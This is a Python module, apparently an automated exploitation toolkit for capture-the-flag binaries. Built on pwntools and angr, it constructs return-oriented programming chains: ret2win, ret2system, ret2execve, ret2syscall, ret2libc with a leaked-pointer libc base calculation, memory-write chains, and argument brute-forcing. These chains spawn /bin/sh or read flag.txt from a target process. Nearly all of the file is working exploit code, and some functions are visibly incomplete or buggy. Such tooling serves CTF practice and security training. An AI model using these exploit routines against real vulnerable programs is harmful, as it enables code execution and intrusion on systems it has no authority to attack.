from typing import Optional
from time import sleep
import re
from pwn import *
import angr
import angrop


def ret2win(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    win_addr = p64(elf.symbols['win'])
    p = process(bin_path)
    p.sendline(start_pay + win_addr)
    sleep(2)
    try:
        p.sendline(b"cat flag.txt")
    except EOFError:
        pass
    out = ""
    while 'flag' not in out:
        try:
            out += p.recvS()
        except EOFError:
            break
    
    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2system(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    try:
        vuln_str = p64(next(elf.search(b"/bin/cat flag.txt")))
    except StopIteration:
        try:
            vuln_str = p64(next(elf.search(b"/bin/sh")))
        except StopIteration:
            return None
    system_addr = p64(elf.symbols['system'])
    r = ROP(elf)
    pop_rdi = p64(r.find_gadget((['pop rdi', 'ret']))[0])

    p = process(bin_path)
    p.sendline(start_pay + pop_rdi + vuln_str + system_addr)
    print(start_pay + pop_rdi + vuln_str + system_addr)
    try:
        p.sendline(b"cat flag.txt")
    except:
        pass
    try:
        out = p.recvS()
    except EOFError:
        return None

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2execve(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    try:
        vuln_str = elf.search("cat flag.txt")
    except StopIteration:
        try:
            vuln_str = elf.search("/bin/sh")
        except StopIteration:
            return None
    system_addr = p64(elf.symbols['execve'])

    r = ROP(elf)
    pop_rdi = p64(r.find_gadget(['pop rdi', 'ret'])[0])
    pop_rsi = p64(r.find_gadget(['pop rsi', 'ret'])[0])
    pop_rcx = p64(r.find_gadget(['pop rdx', 'ret'])[0])

    p = process(bin_path)
    p.sendline(start_pay + pop_rdi + vuln_str + pop_rsi + p64(0) + pop_rcx + p64(0) + system_addr)
    p.sendline(b"cat flag.txt")
    p.recv()
    out = p.recvS()

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2syscall(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    p = process(bin_path)
    elf = ELF(bin_path)
    r=ROP(elf)
    FLAGRE = r"""(flag{[A-Za-z-0-9]{32}})"""


    bin_sh = next(elf.search(b'/bin/sh'))
    print("Using Angrop")
    p = process(bin_path)

    proj = angr.Project(bin_path)
    arop = proj.analyses.ROP()
    arop.find_gadgets_single_threaded()
    chain = arop.set_regs(rax=59, rdi=bin_sh, rsi=0, rdx=0)
    exp = start_pay + chain.payload_str()
    exp += p64(r.find_gadget(['syscall'])[0])
    print(start_pay)
    p.recvuntil(b' >>>')
    p.sendline(exp)
    #sleep(1)
    p.sendline(b'cat flag.txt')
    p.interactive()


def ret2libc(vuln) -> Optional[str]:
    binary = vuln.bin_path
    POINTER_RE = r"""0x([0-9a-fA-F]+)"""

    e = ELF(binary)
    p = process(binary)
    r = ROP(binary)

    initial = p.recvS()
    comp = re.compile(POINTER_RE)
    srch = comp.search(initial)
    if srch is None:
        return None
    print(srch.group(1))
    printf_int = int(srch.group(1), 16)

    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
    libc_r = ROP(libc)
    libc_pop_rdi = libc_r.find_gadget((['pop rdi', 'ret']))[0]
    libc_system = libc.symbols['system'] - libc.symbols['printf'] + printf_int
    bin_sh = next(p.libc.search(b'/bin/sh')) - libc.symbols['printf'] + printf_int
    
    # endian = None
    # if e.endian == 'little':
    #     endian = "<I"
    # elif e.endian == 'big':
    #     endian = ">I"
    # else:
    #     print("What endian is this? " + e.endian)

    payload = b""
    payload += vuln.payload_start
    payload += p64(libc_pop_rdi)
    payload += p64(bin_sh)
    payload += p64(libc_system)
    p.sendline(payload)
    # p.interactive()


def ropwrite(vuln) -> Optional[str]:
    elf = ELF(vuln.bin_path)
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    data = elf.get_section_by_name(".data").header.sh_addr
    project = angr.Project(vuln.bin_path)
    rop = project.analyses.ROP()
    rop.find_gadgets_single_threaded()
    payload = rop.write_to_mem(data, b"cat flag.txt\x00") + rop.set_regs(rdi=data)

    p = process(vuln.bin_path)
    p.sendline(vuln.start_pay + payload)
    try:
        out = p.recvS()
    except EOFError:
        return None

    comp = re.compile(FLAG_RE)
    srch = comp.search(out)
    if srch:
        return srch.group(1)


def ret2win_args(vuln) -> Optional[str]:
    bin_path = vuln.bin_path
    start_pay = vuln.payload_start
    FLAG_RE = r"""(flag\{[A-Za-z_\-0-9]{32}\})"""

    elf = ELF(bin_path)
    win_addr = p64(elf.symbols['win'])
    r = ROP(elf)
    pop_rdi = p64(r.find_gadget((['pop rdi', 'ret']))[0])

    for i in range(256):
        print(f"Attempt #{i}")
        p = process(bin_path)
        p.sendline(start_pay + pop_rdi + p64(i) + win_addr)
        sleep(2)
        try:
            p.sendline(b"cat flag.txt")
        except EOFError:
            pass
        out = ""
        while 'flag' not in out:
            try:
                out += p.recvS()
            except EOFError:
                break
        
        comp = re.compile(FLAG_RE)
        srch = comp.search(out)
        if srch:
            return srch.group(1)